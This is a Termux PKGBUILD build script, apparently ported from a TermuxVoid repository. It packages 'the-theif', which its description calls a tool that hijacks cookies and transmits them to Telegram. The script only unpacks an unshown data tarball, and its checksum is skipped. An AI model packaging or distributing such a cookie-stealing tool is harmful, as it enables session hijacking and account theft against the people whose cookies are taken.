# Maintainer: Alienkrishn [Anon4You]
# Ported from TermuxVoid APT repo (packages/the-theif)

pkgname="the-theif"
pkgver=2.1
pkgrel=1
pkgdesc='A tool that can hijack cookies and transmit them to Telegram using the API.'
arch=('any')
depends=('apksigner' 'apkeditor' 'python')
install="the-theif.install"
options=('!strip' '!debug' '!emptydirs')
source=(the-theif-data.tar.gz)
sha256sums=('SKIP')

build() {
    return 0
}

package() {
    mkdir -p "${pkgdir}/data/data/com.termux/files"
    tar -xzf "${srcdir}/the-theif-data.tar.gz" -C "${pkgdir}/data/data/com.termux/files"
}
